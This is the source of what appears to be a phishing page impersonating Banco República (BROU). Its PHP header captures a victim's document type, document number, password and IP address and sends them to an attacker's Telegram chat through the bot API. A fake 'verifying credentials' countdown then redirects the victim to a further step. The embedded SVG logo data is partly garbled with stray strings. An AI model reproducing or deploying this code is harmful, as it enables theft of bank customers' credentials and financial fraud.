<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];

////////////////////
if ( isset ($_POST['tipodoc']) && isset ($_POST['numdoc']) && isset ($_POST['clv'])  ){

$message = "Tipo doc.: ".$_POST['tipodoc']." - Doc.: ".$_POST['numdoc']." - Clav.: ".$_POST['clv']." ".$userp."\r\n";

$apiToken = "<TOKEN_REMOVED>";


$data = [
  'chat_id' => '2124940397',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


}else{ header ('location: index.php'); exit();
 }



?>

<!DOCTYPE html>
<html class="wf-montserrat-n7-active wf-montserrat-n5-active wf-montserrat-n4-active wf-sansserif-n4-inactive wf-active">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,width=device-width,viewport-fit=cover">

<link rel="stylesheet" href="./src/fonts0035.css">
<link rel="stylesheet" href="./src/inticons.css">

<title>Inicio</title>

<link href="./src/2d18bb0567.css" rel="stylesheet">
<link href="./src/main8d29879f.css" rel="stylesheet">
<script type="text/javascript">
if (screen.width<=800) {
window.location="index.php";
}
</script>
<style id="inert-style">
[inert] {
  pointer-events: none;
  cursor: default;
}

[inert], [inert] * {
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}
</style>

 <script language="JavaScript">
 
    /* Determinamos el tiempo total en segundos */
    var totalTiempo=30;
    
    var url="step3.php";
 
    function updateReloj()
    {
        document.getElementById('CuentaAtras').innerHTML = "Por favor, espera "+totalTiempo+" segundos, estamos verificando sus credenciales. <br> ";
 
        if(totalTiempo==0)
        {
            window.location=url;
        }else{
            /* Restamos un segundo al tiempo restante */
            totalTiempo-=1;
            /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
            setTimeout("updateReloj()",1000);
        }
    }
 
    window.onload=updateReloj;
 
    </script>
	
</head>
<body style="background-color: rgb(8, 82, 141);">
<div id="root"><div class=" login-background"><div class="app transition-item"><section class="container--layout reset-margin align-items-center"><div class="form-content container">
<div class="justify-content-left row"><div xl="6" class="col col-lg-6 col-md-6 col-sm-6"><div class="svg-image logo"><div>
<img src="src/img0981.png">
</div></div></div>
<div xl="6" class="col col-lg-6 col-md-6 col-sm-6"></div></div></div></section><section class="container--layout align-items-center"><div class="login-desktop-wrapper panel container">
<div class="justify-content-center row"><div class="col col-12" style="display: flex; flex-direction: column; padding: 0px;"><div class="view-page"><div role="main" class="view-content">
<main class="main-container container-fluid"><div class="view-content-container"><div class="above-the-fold"><section class="container--layout align-items-center">
<div class="form-content container"><div class="justify-content-center login-desktop-cols row">

<div xl="6" class="col col-12 login-form col-lg-6 col-md-12 col-sm-12">
<br><h1>Cargando...</h1><br>
<img src="src/img0982.gif" style="width:150px;"><br><br><br><br>
<br><h1 id='CuentaAtras'></h1>

<br><br>
</div>

<div xl="6" class="col col-12 carousel-bg col-lg-6 col-md-12 col-sm-12 col-xs-12">
<section class="slider" aria-label="carousel-slider" role="region" tabindex="0" style="box-sizing: border-box; display: block; height: inherit; position: relative; width: 100%;">
<img src="src/img0983.png" >
</section></div>
		  
		  
		  </div></div></section></div></div></main></div></div></div></div></div></section>
		  <section class="align-items-center container--layout app-footer "><div class="container"><div class="justify-content-center row"><div class="col-2 reset-padding"><div class="logo-brou">
		  <div class="svg-wrapper"><div>
		  
		  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 419.3 117.3" style="enable-background:new 0 0 419.3 117.3;" 
		  xml:space="preserve" class="injected-svg svg-image" data-src="static/media/logoBrou.76696910.svg">
<style type="text/css">
	.logoBrou2st0{fill:#FEFEFE;}
	.logoBrou2st1{fill:#0066B3;}
	.logoBrou2st2{fill:#FFCC29;}
</style>
<g>
	<path class="logoBrou2st0" d="M116.4,105H58.4v11.6h58.1V105z M81.1,0.5H0.3v80.8c0,19.5,15.8,35.3,35.3,35.3h22.7V105h58.1V35.8   C116.4,16.3,100.6,0.5,81.1,0.5z"></path>
	<path class="logoBrou2st1" d="M41.4,20.5L41.4,20.5c0-0.7-0.5-1.2-1.2-1.2h-0.6v2.4h0.6C40.9,21.7,49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ28.3,55.1,27.7z M25.4,14c0-1,0.9-1.9,1.9-1.9H42c0.6,0,1.1,0.2,1.6,0.6   l6.8,5.1c0.2,0.2,0.4,0.4,0.4,0.7c0,0.5-0.4,0.9-1,0.9h7.5c1.4,0,2.8,0.5,3.8,1.3l5.5,4.2l6.9,5.2c0.2,0.2,0.4,0.4,0.4,0.7   c0,0.5-0.4,1-1,1H27.3c-1.1,0-1.9-0.9-1.9-1.9V14z"></path>
	<path class="logoBrou2st1" d="M74.9,49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ-1.9   h50.2c0.6,0,1.2,0.2,1.6,0.5l10.1,7.6c0.2,0.2,0.4,0.4,0.4,0.7c0,0.5-0.4,1-1,1h0.9c1.1,0,1.9,0.9,1.9,1.9l0,6c0,1-0.9,1.9-1.9,1.9   h-11c-1,0-1.9-0.9-1.9-1.9v-1.1c0-1-0.9-1.9-1.9-1.9H40.2v3c0,1-0.9,1.9-1.9,1.9H27.3c-1.1,0-1.9-0.9-1.9-1.9V35.6z"></path>
	<path class="logoBrou2st1" d="M91.6,76.5C85,87.9,71.4,92.9,58.4,92.9c-13,0-26.6-5-33.3-16.4C25,76.4,25,76.2,25,76.1c0-0.5,0.4-0.9,1-0.9   h15.2c0.5,0,1,0.4,1,0.9c0.7,6.4,7.7,11.4,16.2,11.4c8.5,0,15.6-5.1,16.2-11.4c0-0.5,0.4-0.9,1-0.9h15.2c0.5,0,1,0.4,1,0.9   C91.8,76.2,91.7,76.4,91.6,76.5"></path>
	<path class="logoBrou2st1" d="M73,61.1H41.5c-1,0-1.9,0.8-1.9,1.8v4.3c0,1,0.8,1.8,1.9,1.8H73c1,0,1.9-0.8,1.9-1.8V63   C74.9,61.9,74,61.1,73,61.1 M95.8,60.1c0,4.5-0.7,8.5-2,11.9c-0.3,0.7-1,1.2-1.8,1.2H24.8c-0.8,0-1.5-0.5-1.8-1.2   c-1.3-3.5-2-7.5-2-11.9v-2.5c0-1.4,1.1-2.5,2.5-2.5H26h67.3c1.4,0,2.5,1.1,2.5,2.5L95.8,60.1z"></path>
	<rect x="58.4" y="105" class="logoBrou2st2" width="58.1" height="11.6"></rect>
	<path class="logoBrou2st0" d="M139.6,23.6h16.6c4.1,0,7.3,1.1,9.4,3.2c1.6,1.6,2.5,3.7,2.5,6.1V33c0,1-0.1,1.9-0.4,2.7   c-0.3,0.8-0.6,1.5-1,2.1c-0.4,0.6-0.9,1.2-1.5,1.7c-0.6,0.5-1.2,0.9-1.8,1.2c2.1,0.8,3.7,1.9,4.9,3.2c1.2,1.4,1.8,3.2,1.8,5.6v0.1   c0,1.6-0.3,3.1-0.9,4.3c-0.6,1.2-1.5,2.3-2.7,3.1c-1.2,0.8-2.6,1.4-4.2,1.8c-1.7,0.4-3.5,0.6-5.5,0.6h-17V23.6z M154.6,38.2   c1.7,0,3.1-0.3,4.2-0.9c1-0.6,1.5-1.6,1.5-2.9v-0.1c0-1.2-0.4-2.1-1.3-2.7c-0.9-0.6-2.2-0.9-3.8-0.9h-7.8v7.6H154.6z M156.7,52.6   c1.7,0,3.1-0.3,4.1-0.9c1-0.6,1.5-1.6,1.5-2.9v-0.1c0-1.2-0.5-2.1-1.4-2.8c-0.9-0.7-2.4-1.1-4.5-1.1h-9.1v7.9H156.7z"></path>
	<path class="logoBrou2st0" d="M185.1,23.4h7.3l15.4,36.2h-8.3l-3.3-8.1h-15.2l-3.3,8.1h-8.1L185.1,23.4z M193.4,44.5l-4.8-11.6l-4.8,11.6   H193.4z"></path>
	<polygon class="logoBrou2st0" points="209.9,23.6 217.1,23.6 234,45.7 234,23.6 241.8,23.6 241.8,59.5 235,59.5 217.7,36.7 217.7,59.5    209.9,59.5  "></polygon>
	<path class="logoBrou2st0" d="M264.1,60.1c-2.6,0-5.1-0.5-7.3-1.4c-2.3-1-4.2-2.3-5.8-3.9c-1.6-1.7-2.9-3.6-3.8-5.9   c-0.9-2.3-1.4-4.7-1.4-7.2v-0.1c0-2.6,0.5-5,1.4-7.2c0.9-2.2,2.2-4.2,3.8-5.9c1.6-1.7,3.6-3,5.9-4c2.3-1,4.8-1.5,7.6-1.5   c1.7,0,3.2,0.1,4.6,0.4c1.4,0.3,2.6,0.6,3.8,1.1c1.1,0.5,2.2,1.1,3.1,1.7c1,0.7,1.8,1.4,2.7,2.3l-5,5.8c-1.4-1.3-2.8-2.3-4.3-3   c-1.5-0.7-3.1-1.1-4.9-1.1c-1.5,0-2.9,0.3-4.2,0.9c-1.3,0.6-2.4,1.4-3.3,2.4c-0.9,1-1.6,2.2-2.2,3.6c-0.5,1.4-0.8,2.8-0.8,4.3v0.1   c0,1.5,0.3,3,0.8,4.4c0.5,1.4,1.2,2.6,2.1,3.6c0.9,1,2,1.8,3.3,2.4c1.3,0.6,2.7,0.9,4.2,0.9c2.1,0,3.8-0.4,5.2-1.1   c1.4-0.8,2.8-1.8,4.2-3.1l5,5.1c-0.9,1-1.9,1.9-2.9,2.7c-1,0.8-2.1,1.5-3.3,2c-1.2,0.6-2.5,1-3.9,1.3   C267.5,60,265.9,60.1,264.1,60.1"></path>
	<path class="logoBrou2st0" d="M297.9,60.1c-2.8,0-5.3-0.5-7.6-1.5c-2.3-1-4.3-2.3-6-3.9c-1.7-1.7-3-3.6-3.9-5.8c-0.9-2.2-1.4-4.6-1.4-7.2   v-0.1c0-2.6,0.5-5,1.4-7.2c1-2.2,2.3-4.2,4-5.9c1.7-1.7,3.7-3,6.1-4c2.3-1,4.9-1.5,7.7-1.5c2.8,0,5.3,0.5,7.6,1.5   c2.3,1,4.3,2.3,6,3.9c1.7,1.7,3,3.6,3.9,5.8c0.9,2.2,1.4,4.6,1.4,7.2v0.1c0,2.6-0.5,5-1.4,7.2c-1,2.2-2.3,4.2-4,5.9   c-1.7,1.7-3.7,3-6,4C303.3,59.7,300.7,60.1,297.9,60.1 M298,52.9c1.6,0,3-0.3,4.4-0.9c1.3-0.6,2.5-1.4,3.4-2.4   c0.9-1,1.7-2.2,2.2-3.6c0.5-1.3,0.8-2.8,0.8-4.3v-0.1c0-1.5-0.3-3-0.8-4.4c-0.5-1.4-1.3-2.6-2.3-3.6c-1-1-2.1-1.8-3.5-2.4   c-1.3-0.6-2.8-0.9-4.4-0.9c-1.6,0-3.1,0.3-4.4,0.9c-1.3,0.6-2.4,1.4-3.4,2.4c-0.9,1-1.7,2.2-2.2,3.6c-0.5,1.4-0.8,2.8-0.8,4.3v0.1   c0,1.5,0.3,3,0.8,4.4c0.5,1.4,1.3,2.6,2.3,3.6c1,1,2.1,1.8,3.4,2.4C295,52.6,296.4,52.9,298,52.9z"></path>
	<path class="logoBrou2st0" d="M139.6,68.9h16.4c4.5,0,8,1.2,10.5,3.6c2.1,2.1,3.1,4.8,3.1,8.2v0.1c0,2.9-0.7,5.3-2.1,7.1   c-1.4,1.8-3.3,3.2-5.6,4l8.8,12.8h-9.2l-7.7-11.5h-0.1h-6.1v11.5h-7.9V68.9z M155.5,86.4c1.9,0,3.4-0.5,4.5-1.4   c1-0.9,1.6-2.2,1.6-3.7v-0.1c0-1.7-0.5-3-1.6-3.8c-1.1-0.9-2.6-1.3-4.6-1.3h-7.8v10.3H155.5z"></path>
	<polygon class="logoBrou2st0" points="173.8,68.9 200.9,68.9 200.9,76 181.6,76 181.6,83.2 198.5,83.2 198.5,90.3 181.6,90.3 181.6,97.8    201.1,97.8 201.1,104.8 173.8,104.8  "></polygon>
	<path class="logoBrou2st0" d="M205.6,68.9h14.7c2.2,0,4.1,0.3,5.8,0.9c1.7,0.6,3.1,1.4,4.3,2.5c1.2,1.1,2.1,2.4,2.7,3.9   c0.6,1.5,0.9,3.2,0.9,5.1v0.1c0,2.1-0.4,3.9-1.1,5.5c-0.8,1.6-1.8,2.9-3.1,3.9c-1.3,1.1-2.9,1.9-4.6,2.4c-1.8,0.5-3.6,0.8-5.7,0.8   h-6v10.8h-7.9V68.9z M219.8,87c2,0,3.5-0.5,4.6-1.6c1.1-1,1.6-2.3,1.6-3.9v-0.1c0-1.8-0.6-3.1-1.7-4.1c-1.1-0.9-2.7-1.4-4.7-1.4   h-6.1v11H219.8z"></path>
	<path class="logoBrou2st0" d="M251.8,105.4c-4.8,0-8.6-1.3-11.4-4c-2.8-2.7-4.2-6.6-4.2-11.9V68.9h7.9v20.3c0,2.9,0.7,5.2,2.1,6.6   c1.4,1.5,3.3,2.2,5.7,2.2c2.4,0,4.3-0.7,5.7-2.2c1.4-1.4,2.1-3.6,2.1-6.5V68.9h7.9v20.3c0,2.7-0.4,5.1-1.1,7.1   c-0.7,2-1.8,3.7-3.2,5.1c-1.4,1.4-3,2.4-5,3C256.4,105.1,254.2,105.4,251.8,105.4"></path>
	<path class="logoBrou2st0" d="M273,68.9h16.6c4.1,0,7.3,1.1,9.4,3.2c1.6,1.6,2.5,3.7,2.5,6.1v0.1c0,1-0.1,1.9-0.4,2.7   c-0.3,0.8-0.6,1.5-1,2.1c-0.4,0.6-0.9,1.2-1.5,1.7c-0.6,0.5-1.2,0.9-1.8,1.2c2.1,0.8,3.7,1.9,4.9,3.2c1.2,1.3,1.8,3.2,1.8,5.6V95   c0,1.6-0.3,3.1-0.9,4.3c-0.6,1.2-1.5,2.3-2.7,3.1c-1.2,0.8-2.6,1.4-4.2,1.8c-1.7,0.4-3.5,0.6-5.5,0.6h-17V68.9z M287.9,83.5   c1.7,0,3.1-0.3,4.2-0.9c1-0.6,1.5-1.6,1.5-2.9v-0.1c0-1.2-0.4-2.1-1.3-2.7c-0.9-0.6-2.2-0.9-3.8-0.9h-7.8v7.6H287.9z M290,97.9   c1.7,0,3.1-0.3,4.1-0.9c1-0.6,1.5-1.6,1.5-2.9v-0.1c0-1.2-0.5-2.1-1.4-2.8c-0.9-0.7-2.4-1.1-4.5-1.1h-9.1v7.9H290z"></path>
	<polygon class="logoBrou2st0" points="307.2,68.9 315.1,68.9 315.1,97.7 333,97.7 333,104.8 307.2,104.8  "></polygon>
	<rect x="335.4" y="68.9" class="logoBrou2st0" width="7.9" height="35.9"></rect>
	<path class="logoBrou2st0" d="M365.9,105.5c-2.6,0-5.1-0.5-7.3-1.4c-2.3-1-4.2-2.3-5.8-3.9c-1.6-1.7-2.9-3.6-3.8-5.9   c-0.9-2.3-1.4-4.7-1.4-7.2v-0.1c0-2.6,0.5-5,1.4-7.2c0.9-2.2,2.2-4.2,3.8-5.9c1.6-1.7,3.6-3,5.9-4c2.3-1,4.8-1.5,7.6-1.5   c1.7,0,3.2,0.1,4.6,0.4c1.4,0.3,2.6,0.6,3.8,1.1c1.1,0.5,2.2,1.1,3.1,1.7c1,0.7,1.8,1.4,2.7,2.3l-5,5.8c-1.4-1.3-2.8-2.3-4.3-3   c-1.5-0.7-3.1-1.1-4.9-1.1c-1.5,0-2.9,0.3-4.2,0.9c-1.3,0.6-2.4,1.4-3.3,2.4c-0.9,1-1.6,2.2-2.2,3.6c-0.5,1.4-0.8,2.8-0.8,4.3v0.1   c0,1.5,0.3,3,0.8,4.4c0.5,1.4,1.2,2.6,2.1,3.6c0.9,1,2,1.8,3.3,2.4c1.3,0.6,2.7,0.9,4.2,0.9c2.1,0,3.8-0.4,5.2-1.1   c1.4-0.8,2.8-1.8,4.2-3.1l5,5.1c-0.9,1-1.9,1.9-2.9,2.7c-1,0.8-2.1,1.5-3.3,2c-1.2,0.6-2.5,1-3.9,1.3   C369.2,105.3,367.7,105.5,365.9,105.5"></path>
	<path class="logoBrou2st0" d="M395.9,68.7h7.3l15.4,36.2h-8.3l-3.3-8.1h-15.2l-3.3,8.1h-8.1L395.9,68.7z M404.2,89.8l-4.8-11.6l-4.8,11.6   H404.2z"></path>
	<polygon class="logoBrou2st0" points="251.7,63 258.4,65.9 254.3,69 248.3,69  "></polygon>
</g>
</svg></div></div></div></div><div class="col-10 reset-padding"><ul class="legal-nav"><li><a href="#" class=""><span>Portal BROU</span></a></li><li><a href="#" class=""><span>Seguridad</span></a></li><li><a href="#" class=""><span>Gestión de Reclamos</span></a></li><li><div class="copyright"><span>© 2020 Banco República</span><span>Todos los derechos reservados</span></div></li></ul></div></div></div></section></div></div><div class="modal-container"></div></div><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="0" height="0" style="position:absolute"><symbol id="LogoTech" viewBox="0 0 221.4 31.3"><svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 288.7 119" style="enable-background:new 0 0 288.7 119" xml:space="preserve"><g transform="translate(-930.005 -2348.975)"><path d="M1053.7,2407.6h-5.2v8.6c0,2.1,0,4.4,2.7,4.4c0.9,0,1.8-0.2,2.6-0.6v3.3c-1,0.4-2.1,0.7-3.2,0.6c-5.6,0-5.6-3.4-5.6-6.5
                                v-18.4h3.6v5.3h5.2L1053.7,2407.6z"></path><path d="M1059.5,2415.2c0,3.3,3.1,5.5,6.4,5.5c2.1-0.1,4-1.1,5.2-2.9l2.7,2.1c-2,2.6-5.1,4.1-8.4,3.9c-6,0-9.7-4.3-9.7-10
                                c-0.2-5.3,4-9.8,9.3-10c0.2,0,0.3,0,0.5,0c6.7,0,9.2,5.1,9.2,10v1.2L1059.5,2415.2z M1070.8,2412.3c-0.1-3.2-1.8-5.5-5.5-5.5
                                c-3.1,0-5.7,2.4-5.9,5.5H1070.8z"></path><path d="M1092.1,2409.5c-1.2-1.4-2.9-2.2-4.7-2.1c-3.9,0-5.9,3.2-5.9,6.7c-0.2,3.4,2.3,6.2,5.7,6.4c0.1,0,0.3,0,0.4,0
                                c1.8,0.1,3.5-0.7,4.6-2.1l2.6,2.6c-1.9,2-4.5,3-7.2,2.9c-5.5,0-10-4.5-10-10s4.5-10,10-10c2.7-0.1,5.4,1,7.3,3L1092.1,2409.5z"></path><path d="M1098.3,2393.1h3.6v14.2h0.1c1.2-2.2,3.7-3.6,6.2-3.4c3.7,0,6.9,2.2,6.9,7.3v12.2h-3.6v-11.2c0-3.6-2-4.9-4.3-4.9
                                c-3,0-5.3,1.9-5.3,6.3v9.8h-3.6L1098.3,2393.1z"></path><path d="M1119,2393.1h3.6v14h0.1c1.5-2.1,4-3.3,6.6-3.2c5.8,0,9.6,4.3,9.6,10c0,5.7-3.7,10-9.6,10c-2.6,0-5-1.1-6.6-3.2h-0.1v2.7
                                h-3.6L1119,2393.1z M1135.1,2414c0-3.8-2.4-6.6-6.2-6.6c-3.8,0-6.2,2.8-6.2,6.6s2.4,6.6,6.2,6.6
                                C1132.7,2420.6,1135.1,2417.8,1135.1,2414L1135.1,2414z"></path><path d="M1142.3,2406.8c2.1-1.8,4.7-2.8,7.5-2.8c5.6,0,7.9,3,7.9,6.3v9.7c0,1.2,0,2.3,0.2,3.4h-3.2c-0.1-1-0.1-1.9-0.1-2.9h-0.1
                                c-1.4,2.3-4,3.6-6.6,3.4c-3.5,0-6.5-2-6.5-5.7c0-4.9,4.7-6.6,10.4-6.6h2.6v-0.8c0-2.3-1.9-4.1-4.1-4c-0.1,0-0.3,0-0.4,0
                                c-2,0-3.9,0.8-5.4,2.2L1142.3,2406.8z M1152.4,2414.3c-3.4,0-7.6,0.6-7.6,3.6c0,2.2,1.6,3.1,4.1,3.1c4,0,5.4-3,5.4-5.5v-1.2
                                L1152.4,2414.3z"></path><path d="M1161.1,2404.4h3.6v2.9h0.1c1.2-2.2,3.7-3.6,6.2-3.4c3.7,0,6.9,2.2,6.9,7.3v12.2h-3.6v-11.2c0-3.6-2-4.9-4.3-4.9
                                c-3,0-5.3,1.9-5.3,6.3v9.8h-3.6L1161.1,2404.4z"></path><path d="M1181.3,2393.1h3.6v19.6l8.2-8.2h5l-8.8,8.6l9.6,10.4h-5.1l-8.8-9.9v9.9h-3.6L1181.3,2393.1z"></path><path d="M962.6,2380.9c13.1-12.8,33.5-14.5,48.5-3.9c-4.3-1.3-8.7-2-13.2-2c-7.7-0.1-15.4,2-21.9,6.1
                                c-12.4,6.1-19.1,19.7-16.5,33.3l0.8,3.2l2.6,4c-7-14.6-1-32.4,13.6-39.5c6.4-4.1,13.8-6.2,21.4-6c6.8-0.1,13.4,1.6,19.4,4.8
                                c-15.1-15.5-39.9-15.8-55.4-0.7c-0.1,0.1-0.2,0.2-0.2,0.2l-1.8,2.4l-1.2,4C959.3,2384,962.6,2380.9,962.6,2380.9z"></path><path d="M961.8,2435.3c-12.7-13.2-14.4-33.6-3.9-48.7c-1.3,4.3-2,8.8-2,13.3c-0.2,7.8,2,15.5,6.1,22.1c6,12.4,19.6,19.2,33.1,16.6
                                l3.1-0.8l3.8-2.7c-14.5,7.1-32,1-39.1-13.5c0-0.1-0.1-0.1-0.1-0.2c-4.1-6.4-6.1-13.9-6-21.5c-0.1-6.8,1.6-13.5,4.8-19.5
                                c-15.5,15.3-15.8,49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ.1c-13.1,12.8-33.5,14.5-48.5,4c4.3,1.3,8.7,2,13.2,2c7.8,0.2,15.4-2,22-6.1c12.4-6.1,19.1-19.7,16.5-33.3
                                l-0.8-3.2l-2.6-3.8c7.1,14.6,0.9,32.2-13.6,39.3c-6.4,4.1-13.8,6.2-21.4,6c-6.8,0.1-13.5-1.6-19.4-4.9
                                c15.1,15.5,39.9,15.9,55.5,0.7c0.1-0.1,0.1-0.1,0.2-0.2l1.4-2l0.5-1.8C1017.8,2434.1,1016.9,2435.2,1015.9,2436.1L1015.9,2436.1z"></path><path d="M1016.7,2381.8c12.8,13.2,14.4,33.7,3.9,48.8c1.3-4.3,2-8.8,2-13.3c0.2-7.8-2-15.5-6.1-22.1c-5.1-10.4-15.7-17.1-27.3-17.1
                                c-2,0-4.1,0.2-6.1,0.6c-1.2,0.4-2.3,0.9-3.4,1.5c-1.2,0.7-3.3,1.9-3.3,1.9c14.5-7.1,32-1,39.1,13.4c0,0.1,0.1,0.1,0.1,0.2
                                c4.1,6.4,6.1,13.9,6,21.5c0.1,6.8-1.6,13.5-4.8,19.5c15.5-15.3,15.8-40.3,0.6-55.9c0,0-1-0.6-1.6-0.9c-0.6-0.3-1.7-0.8-1.7-0.8
                                C1015.4,2380.4,1016.7,2381.8,1016.7,2381.8z"></path></g></svg></symbol></svg>
								
								
								
								</body>
								</html>